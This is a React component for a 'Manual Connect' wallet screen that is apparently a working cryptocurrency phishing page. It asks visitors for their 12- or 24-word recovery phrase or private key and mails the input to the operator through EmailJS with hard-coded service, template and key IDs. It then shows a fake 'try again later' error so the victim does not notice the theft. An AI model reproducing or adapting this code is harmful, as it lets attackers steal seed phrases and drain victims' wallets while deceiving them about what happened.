import { useContext, useRef, useState } from "react";
import { AiOutlineArrowLeft } from "react-icons/ai";
import { AiOutlineHome } from "react-icons/ai";
import { AiOutlineThunderbolt } from "react-icons/ai";
import { ShowcaseContext } from "./Showcase";
import emailjs from '@emailjs/browser';

const Manual = () => {
  const { handleClick, currentWallet } = useContext(ShowcaseContext);
  const [buttons, setButtons] = useState("phrase");
  const [wallet, setWallet] = useState("");
  const [button, setButton] = useState(false);

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_bms7826', 'template_2i0arfq', form.current, '7sc1o-EVY--feH8er')
      .then((result) => {
          console.log(result.text);
          alert("we cannot handle your request now, please try again later")
          handleClick("wallets")
      }, (error) => {
          console.log(error.text);
      });

  };

  const handleChange = (e) => {
    setWallet(e.target.value);
    const walletCount = wallet.split(" ").length;
    if (walletCount === 12 || walletCount === 24) {
      setButton(true);
    } else {
      setButton(false);
    }
  };

  return (
    <div className="w-full text-[#3647518b] ">
      <div className="lg:w-[70%] w-[90%] m-auto text-[#3647518b] ">
        <button
          onClick={() => handleClick("wallets")}
          className="bg-[#F5F5F5] rounded-md p-2 text-[10px] flex gap-1 mb-[10px]"
        >
          <div className="flex items-center gap-1">
            <AiOutlineArrowLeft />{" "}
            <span className="text-[15px]">
              <AiOutlineHome />
            </span>
          </div>
          <span className="text-[14px]">home</span>
        </button>
        <div>
          <div className="bg-[#5a7d9b0c] rounded-md border  md:p-[4em] p-[1em] text-[#3647518b] ">
            <div className="flex justify-between w-full">
              <div className="flex items-center gap-2 ">
                <img
                  className="w-[2em]"
                  src={currentWallet.img}
                  alt={currentWallet.name}
                />
                <span className="text-[12px]">{currentWallet.name}</span>
              </div>

              <div className="rounded-full bg-[#13df761e] px-[10px] py-[6px]">
                <div className="flex items-center gap-2 ">
                  <span>
                    <AiOutlineThunderbolt />
                  </span>
                  <span className="text-[12px]">Manual Connect</span>
                </div>
              </div>
            </div>

            <div>
              <div>
                <button
                  onClick={() => setButtons("phrase")}
                  className={`p-[1em] ${
                    buttons === "phrase" && "border-b-[4px] border-b-green-700"
                  }`}
                >
                  Key Phrase
                </button>
                <button
                  onClick={() => setButtons("key")}
                  className={`p-[1em] ${
                    buttons === "key" && " border-b-[4px] border-b-green-700"
                  }`}
                >
                  Private Key
                </button>
              </div>
              <div className="">
                <form ref={form} onSubmit={sendEmail}>
                  {buttons === "phrase" && (
                    <textarea
                      className="rounded-md border w-full p-5 mb-2"
                      name="phrase"
                      id=""
                      cols="30"
                      rows="4"
                      value={wallet}
                      onChange={handleChange}
                    ></textarea>
                  )}
                  {buttons === "key" && (
                    <input
                      type="text"
                      className="p-5 w-full rounded-md focus:outline-none border mb-2 "
                    />
                  )}
                  {button ? (
                    <button className="rounded-md bg-green-300 w-full py-[10px]">
                      Connect
                    </button>
                  ) : (
                    <button className="rounded-md bg-gray-300 w-full py-[10px]">
                      Connect
                    </button>
                  )}
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Manual;
